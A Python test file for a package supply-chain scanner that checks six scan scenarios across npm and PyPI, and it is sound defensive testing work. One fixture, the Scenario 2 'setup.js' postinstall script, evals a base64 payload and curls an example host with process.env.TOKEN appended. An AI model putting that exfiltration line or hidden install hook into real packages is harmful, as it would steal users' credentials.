"""End-to-end verification of the 6 key Veritor evaluation scenarios.

Scenario 1: Legitimate npm package with generated files.
Scenario 2: Package with harmless simulated suspicious modifications.
Scenario 3: Package with missing source release.
Scenario 4: Package with unavailable provenance.
Scenario 5: Scan when Ollama is unavailable.
Scenario 6: PyPI package analysis.
"""

import hashlib
import io
import zipfile
from pathlib import Path
from unittest.mock import AsyncMock
from uuid import uuid4

import httpx
import pytest

from app.adapters.base import (
    ArtifactHash,
    ArtifactInfo,
    DownloadedArtifact,
    PackageAdapter,
    PackageMetadata,
    SourceRepository,
)
from app.ai.client import OllamaClient
from app.ai.investigator import AIInvestigator
from app.ai.models import AIInvestigationStatus
from app.comparison.models import GeneratedClassification
from app.provenance.npm import NpmProvenanceChecker
from app.provenance.pypi import PyPIProvenanceChecker
from app.scans.pipeline import execute_scan_pipeline
from app.schemas.scans import Ecosystem, ScanState
from app.scoring.risk import RiskLevel
from app.source.models import (
    Confidence,
    GitHubRepository,
    MatchMethod,
    MatchStatus,
    SourceMatch,
    UncertainReason,
)
from tests.test_comparison import make_metadata, manifest, matched
from tests.test_provenance import FakeVerifier
from tests.test_release_analysis import FakeAdapter, FakeResolver

pytestmark = pytest.mark.anyio


def make_wheel(files: dict[str, str]) -> bytes:
    """Create an in-memory zip archive representing a Python wheel."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for path, content in files.items():
            zf.writestr(path, content.encode("utf-8"))
    return buf.getvalue()


def make_mock_investigator() -> AIInvestigator:
    mock_ollama = AsyncMock(spec=OllamaClient)
    mock_ollama.model = "qwen2.5-coder:7b"
    mock_ollama.chat_json.return_value = {
        "summary": "AI static verification completed.",
        "findings_explanations": [],
        "overall_uncertainty": "Low",
        "recommendations": ["No issues detected."],
    }
    return AIInvestigator(client=mock_ollama)


class FakePyPIWheelAdapter(PackageAdapter):
    """Mock PyPI adapter serving wheel artifacts."""

    ecosystem = Ecosystem.PYPI

    def __init__(self, metadata: PackageMetadata, files: dict[str, str]) -> None:
        self.raw_bytes = make_wheel(files)
        digest = hashlib.sha256(self.raw_bytes).hexdigest()
        self.metadata = metadata.model_copy(
            update={
                "artifacts": (
                    ArtifactInfo(
                        filename=f"{metadata.name}-{metadata.version}-py3-none-any.whl",
                        url=f"https://files.pythonhosted.org/packages/wheel/{metadata.name}-{metadata.version}.whl",
                        hashes=(ArtifactHash(algorithm="sha256", hex_digest=digest),),
                    ),
                )
            }
        )

    async def fetch_metadata(self, package_name: str, version: str) -> PackageMetadata:
        return self.metadata

    async def download_artifact(
        self, artifact: ArtifactInfo, destination: Path
    ) -> DownloadedArtifact:
        target = destination / artifact.filename if destination.is_dir() else destination
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(self.raw_bytes)
        return DownloadedArtifact(
            path=target,
            size_bytes=len(self.raw_bytes),
            sha256=hashlib.sha256(self.raw_bytes).hexdigest(),
            verified_algorithms=("sha256",),
        )


# ---------------------------------------------------------------------------
# Scenario 1: Legitimate npm package with generated files
# ---------------------------------------------------------------------------
async def test_scenario_1_legitimate_npm_package_with_generated_files(tmp_path: Path) -> None:
    """Verifies that legitimate compiler/bundler artifacts are classified as

    LIKELY_GENERATED and do not trigger false positive security alarms.
    """
    work_dir = tmp_path / "scenario_1"

    # Source contains TypeScript code and tsconfig
    source_files = {
        "package.json": (
            '{"name": "math-utils", "version": "1.0.0", "scripts": {"build": "tsc"}, '
            '"main": "dist/index.js"}'
        ),
        "tsconfig.json": '{"compilerOptions": {"outDir": "dist", "sourceMap": true}}',
        "src/index.ts": (
            "export function add(a: number, b: number): number {\n    return a + b;\n}\n"
        ),
    }

    # Tarball contains compiled JavaScript and sourcemap
    dist_js = (
        '"use strict";\nObject.defineProperty(exports, "__esModule", { value: true });\n'
        "function add(a, b) {\n    return a + b;\n}\nexports.add = add;\n"
        "//# sourceMappingURL=index.js.map"
    )
    dist_map = (
        '{"version":3,"file":"index.js","sourceRoot":"","sources":["../src/index.ts"],'
        '"names":[],"mappings":"AAAA,SAAgB,GAAG,CAAC,CAAS,EAAE,CAAS;IACpC,OAAO,CAAC,GAAG,CAAC,CAAC;AACjB,CAAC;AAFD,sBAEC"}'
    )
    package_files = {
        "package.json": (
            '{"name": "math-utils", "version": "1.0.0", "scripts": {"build": "tsc"}, '
            '"main": "dist/index.js"}'
        ),
        "dist/index.js": dist_js,
        "dist/index.js.map": dist_map,
    }

    adapter = FakeAdapter(make_metadata(name="math-utils"), package_files)
    resolver = FakeResolver(matched(), source_files)

    transport = httpx.MockTransport(lambda _: httpx.Response(404))
    async with httpx.AsyncClient(transport=transport) as client:
        checker = NpmProvenanceChecker(client, verifier=FakeVerifier())
        investigator = make_mock_investigator()

        report = await execute_scan_pipeline(
            scan_id=uuid4(),
            ecosystem=Ecosystem.NPM,
            package_name="math-utils",
            version="1.0.0",
            work_dir=work_dir,
            adapter=adapter,
            resolver=resolver,  # type: ignore[arg-type]
            provenance_checker=checker,
            ai_investigator=investigator,
        )

        assert report.status is ScanState.COMPLETED
        assert report.risk is not None
        # Legitimate build artifact must be evaluated as LOW risk
        assert report.risk.level == RiskLevel.LOW
        assert report.risk.score <= 20

        # Verify artifact classification
        assert report.comparison is not None
        comp_dict = report.comparison.model_dump()
        dist_entry = next((f for f in comp_dict["files"] if f["path"] == "dist/index.js"), None)
        assert dist_entry is not None
        assert dist_entry["generated"] is not None
        assert (
            dist_entry["generated"]["classification"]
            == GeneratedClassification.LIKELY_GENERATED.value
        )

        # No suspicious security findings
        assert report.security is not None
        assert len(report.security.findings) == 0


# ---------------------------------------------------------------------------
# Scenario 2: Package with harmless simulated suspicious modifications
# ---------------------------------------------------------------------------
async def test_scenario_2_harmless_simulated_suspicious_modifications(tmp_path: Path) -> None:
    """Verifies that unauthorized added install scripts with dynamic execution,

    obfuscation, and network calls trigger high-confidence security findings and elevated risk.
    """
    work_dir = tmp_path / "scenario_2"

    # Clean source repository
    source_files = {
        "package.json": manifest(name="utility-kit", version="2.0.0"),
        "index.js": "module.exports = { helper: () => 'clean' };",
    }

    # Published tarball has injected postinstall script with suspicious patterns
    malicious_script = (
        "const cp = require('child_process');\n"
        "const code = Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString('ascii');\n"
        "eval(code);\n"
        "cp.exec('curl -s https://test-probe.example.com/' + process.env.TOKEN);\n"
    )

    package_files = {
        "package.json": (
            '{"name": "utility-kit", "version": "2.0.0", '
            '"scripts": {"postinstall": "node setup.js"}}'
        ),
        "index.js": "module.exports = { helper: () => 'clean' };",
        "setup.js": malicious_script,
    }

    adapter = FakeAdapter(
        make_metadata(name="utility-kit").model_copy(update={"version": "2.0.0"}), package_files
    )
    resolver = FakeResolver(matched(), source_files)

    transport = httpx.MockTransport(lambda _: httpx.Response(404))
    async with httpx.AsyncClient(transport=transport) as client:
        checker = NpmProvenanceChecker(client, verifier=FakeVerifier())
        mock_ollama = AsyncMock(spec=OllamaClient)
        mock_ollama.model = "qwen2.5-coder:7b"
        mock_ollama.chat_json.return_value = {
            "summary": "Suspicious injected install script detected",
            "findings_explanations": [
                {
                    "finding_ref": "EXEC-001",
                    "path": "setup.js",
                    "line": 3,
                    "explanation": "Evaluates base64 decoded payload",
                    "behavior_analysis": "Dynamic code execution during postinstall",
                    "uncertainty": "Low",
                    "recommendation": "Do not install",
                }
            ],
            "overall_uncertainty": "Low",
            "recommendations": ["Reject package release"],
        }
        investigator = AIInvestigator(client=mock_ollama)

        report = await execute_scan_pipeline(
            scan_id=uuid4(),
            ecosystem=Ecosystem.NPM,
            package_name="utility-kit",
            version="2.0.0",
            work_dir=work_dir,
            adapter=adapter,
            resolver=resolver,  # type: ignore[arg-type]
            provenance_checker=checker,
            ai_investigator=investigator,
        )

        assert report.status is ScanState.COMPLETED

        # Security scanner must catch multiple findings
        assert report.security is not None
        rule_ids = [f.rule_id for f in report.security.findings]
        # eval / child_process / base64 / postinstall script diff
        assert any(
            rid.startswith("EXEC") or rid.startswith("PROC") or rid.startswith("OBF")
            for rid in rule_ids
        )
        assert any(rid.startswith("LIFE") for rid in rule_ids)

        # Artifact classifier must flag setup.js as SUSPICIOUS
        assert report.comparison is not None
        comp_dict = report.comparison.model_dump()
        setup_entry = next((f for f in comp_dict["files"] if f["path"] == "setup.js"), None)
        assert setup_entry is not None
        assert setup_entry["generated"] is not None
        assert (
            setup_entry["generated"]["classification"] == GeneratedClassification.SUSPICIOUS.value
        )

        # Deterministic Risk Engine must flag this as HIGH or CRITICAL
        assert report.risk is not None
        assert report.risk.level in (RiskLevel.HIGH, RiskLevel.CRITICAL)
        assert report.risk.score >= 60
        assert len(report.risk.factors) > 0
        assert len(report.risk.contributing_evidence) > 0


# ---------------------------------------------------------------------------
# Scenario 3: Package with missing source release
# ---------------------------------------------------------------------------
async def test_scenario_3_package_with_missing_source_release(tmp_path: Path) -> None:
    """Verifies that when a package's version tag/commit cannot be matched to source,

    the resolver returns UNCERTAIN, and the risk engine does not treat missing source as safe.
    """
    work_dir = tmp_path / "scenario_3"

    pkg_files = {
        "package.json": manifest(name="ghost-pkg", version="9.9.9"),
        "index.js": "console.log('unverified release');",
    }

    adapter = FakeAdapter(
        make_metadata(name="ghost-pkg").model_copy(update={"version": "9.9.9"}), pkg_files
    )

    # Source repository cannot resolve version 9.9.9
    unmatched_result = SourceMatch(
        status=MatchStatus.UNCERTAIN,
        repository=GitHubRepository(owner="ghost-org", name="ghost-pkg"),
        reason=UncertainReason.NO_MATCHING_TAG,
        explanation="Tag 'v9.9.9' does not exist in upstream git repository",
    )
    resolver = FakeResolver(unmatched_result, {})

    transport = httpx.MockTransport(lambda _: httpx.Response(404))
    async with httpx.AsyncClient(transport=transport) as client:
        checker = NpmProvenanceChecker(client, verifier=FakeVerifier())
        investigator = make_mock_investigator()

        report = await execute_scan_pipeline(
            scan_id=uuid4(),
            ecosystem=Ecosystem.NPM,
            package_name="ghost-pkg",
            version="9.9.9",
            work_dir=work_dir,
            adapter=adapter,
            resolver=resolver,  # type: ignore[arg-type]
            provenance_checker=checker,
            ai_investigator=investigator,
        )

        assert report.status is ScanState.COMPLETED

        # Source match status is correctly recorded as UNCERTAIN
        assert report.source_match is not None
        assert report.source_match.status is MatchStatus.UNCERTAIN

        # Missing source must prevent false "clean" assumption
        assert report.risk is not None
        # Heuristic engine incorporates source uncertainty into risk evaluation
        factor_texts = [f"{f.id} {f.explanation}".lower() for f in report.risk.factors]
        assert any("source" in t or "uncertain" in t for t in factor_texts)


# ---------------------------------------------------------------------------
# Scenario 4: Package with unavailable provenance
# ---------------------------------------------------------------------------
async def test_scenario_4_package_with_unavailable_provenance(tmp_path: Path) -> None:
    """Verifies that missing or unavailable provenance attestations award 0 risk points

    and do NOT falsely imply maliciousness or inflate the risk score.
    """
    work_dir = tmp_path / "scenario_4"

    files = {
        "package.json": manifest(name="provenance-free", version="1.0.0"),
        "index.js": "module.exports = 42;",
    }

    adapter = FakeAdapter(make_metadata(name="provenance-free"), files)
    resolver = FakeResolver(matched(), files)

    # Registry has no provenance bundle (404)
    transport = httpx.MockTransport(lambda _: httpx.Response(404))
    async with httpx.AsyncClient(transport=transport) as client:
        checker = NpmProvenanceChecker(client, verifier=FakeVerifier())
        investigator = make_mock_investigator()

        report = await execute_scan_pipeline(
            scan_id=uuid4(),
            ecosystem=Ecosystem.NPM,
            package_name="provenance-free",
            version="1.0.0",
            work_dir=work_dir,
            adapter=adapter,
            resolver=resolver,  # type: ignore[arg-type]
            provenance_checker=checker,
            ai_investigator=investigator,
        )

        assert report.status is ScanState.COMPLETED

        # Provenance is explicitly UNAVAILABLE
        assert report.provenance is not None
        assert report.provenance.status.value == "UNAVAILABLE"

        # Missing provenance alone must NOT flag as HIGH risk
        assert report.risk is not None
        assert report.risk.level == RiskLevel.LOW
        assert report.risk.score <= 15

        # Provenance factor confirms 0 points added for missing provenance
        prov_factor = next(
            (f for f in report.risk.factors if f.id == "PROVENANCE_UNAVAILABLE"), None
        )
        assert prov_factor is not None
        assert prov_factor.points == 0


# ---------------------------------------------------------------------------
# Scenario 5: Scan when Ollama is unavailable
# ---------------------------------------------------------------------------
async def test_scenario_5_scan_when_ollama_is_unavailable(tmp_path: Path) -> None:
    """Verifies that when Ollama is offline or times out, the scan pipeline continues,

    the AI investigator reports OFFLINE gracefully, and deterministic risk results are preserved.
    """
    work_dir = tmp_path / "scenario_5"

    pkg_files = {
        "package.json": manifest(name="offline-ai-test", version="1.0.0"),
        "index.js": "eval('console.log(1)');",
    }
    source_files = {
        "package.json": manifest(name="offline-ai-test", version="1.0.0"),
        "index.js": "console.log(1);",
    }

    adapter = FakeAdapter(make_metadata(name="offline-ai-test"), pkg_files)
    resolver = FakeResolver(matched(), source_files)

    transport = httpx.MockTransport(lambda _: httpx.Response(404))
    async with httpx.AsyncClient(transport=transport) as client:
        checker = NpmProvenanceChecker(client, verifier=FakeVerifier())

        # Simulate Ollama connection failure (ConnectError)
        failing_client = AsyncMock(spec=OllamaClient)
        failing_client.model = "qwen2.5-coder:7b"
        failing_client.is_available.return_value = False
        failing_client.chat_json.side_effect = httpx.ConnectError(
            "Connection refused by Ollama daemon"
        )

        investigator = AIInvestigator(client=failing_client)

        report = await execute_scan_pipeline(
            scan_id=uuid4(),
            ecosystem=Ecosystem.NPM,
            package_name="offline-ai-test",
            version="1.0.0",
            work_dir=work_dir,
            adapter=adapter,
            resolver=resolver,  # type: ignore[arg-type]
            provenance_checker=checker,
            ai_investigator=investigator,
        )

        assert report.status is ScanState.COMPLETED

        # Deterministic security scanner still caught the eval
        assert report.security is not None
        assert len(report.security.findings) >= 1

        # Deterministic risk engine evaluated correctly without AI
        assert report.risk is not None
        assert report.risk.score >= 5

        # AI section reports OFFLINE, FAILED, or fallback without crashing
        assert report.ai is not None
        assert report.ai.status in (
            AIInvestigationStatus.FAILED,
            AIInvestigationStatus.UNAVAILABLE,
            AIInvestigationStatus.SKIPPED,
        )


# ---------------------------------------------------------------------------
# Scenario 6: PyPI package analysis
# ---------------------------------------------------------------------------
async def test_scenario_6_pypi_package_analysis(tmp_path: Path) -> None:
    """Verifies end-to-end PyPI package analysis using binary wheel (.whl) format,

    safe zip extraction, Python AST comparison, and PEP 740 provenance checks.
    """
    work_dir = tmp_path / "scenario_6"

    wheel_files = {
        "my_library/__init__.py": "__version__ = '1.2.0'\nfrom .core import calculate\n",
        "my_library/core.py": "def calculate(val: int) -> int:\n    return val * 2\n",
        "my_library-1.2.0.dist-info/METADATA": (
            "Metadata-Version: 2.1\nName: my-library\nVersion: 1.2.0\n"
        ),
    }

    source_files = {
        "my_library/__init__.py": "__version__ = '1.2.0'\nfrom .core import calculate\n",
        "my_library/core.py": "def calculate(val: int) -> int:\n    return val * 2\n",
        "pyproject.toml": '[project]\nname = "my-library"\nversion = "1.2.0"\n',
    }

    metadata = make_metadata(name="my-library").model_copy(
        update={
            "ecosystem": Ecosystem.PYPI,
            "version": "1.2.0",
            "repository": SourceRepository(
                declared="https://github.com/example/my-library",
                url="https://github.com/example/my-library",
            ),
        }
    )

    adapter = FakePyPIWheelAdapter(metadata, wheel_files)

    match_result = SourceMatch(
        status=MatchStatus.MATCHED,
        repository=GitHubRepository(owner="example", name="my-library"),
        commit_sha="c" * 40,
        method=MatchMethod.PACKAGE_TAG,
        confidence=Confidence.HIGH,
        tag="v1.2.0",
        explanation="Exact tag match v1.2.0",
    )
    resolver = FakeResolver(match_result, source_files)

    transport = httpx.MockTransport(lambda _: httpx.Response(404))
    async with httpx.AsyncClient(transport=transport) as client:
        checker = PyPIProvenanceChecker(client)
        investigator = make_mock_investigator()

        report = await execute_scan_pipeline(
            scan_id=uuid4(),
            ecosystem=Ecosystem.PYPI,
            package_name="my-library",
            version="1.2.0",
            work_dir=work_dir,
            adapter=adapter,
            resolver=resolver,  # type: ignore[arg-type]
            provenance_checker=checker,
            ai_investigator=investigator,
        )

        assert report.status is ScanState.COMPLETED
        assert report.ecosystem is Ecosystem.PYPI
        assert report.package_name == "my-library"
        assert report.version == "1.2.0"

        # Comparison succeeded across Python files
        assert report.comparison is not None
        comp_dict = report.comparison.model_dump()
        core_entry = next(
            (f for f in comp_dict["files"] if f["path"] == "my_library/core.py"), None
        )
        assert core_entry is not None
        assert core_entry["status"] == "IDENTICAL"

        # Provenance handled
        assert report.provenance is not None
        assert report.provenance.status.value in ("UNAVAILABLE", "NOT_VERIFIED")

        # Clean risk assessment
        assert report.risk is not None
        assert report.risk.level == RiskLevel.LOW
        assert report.risk.score <= 15
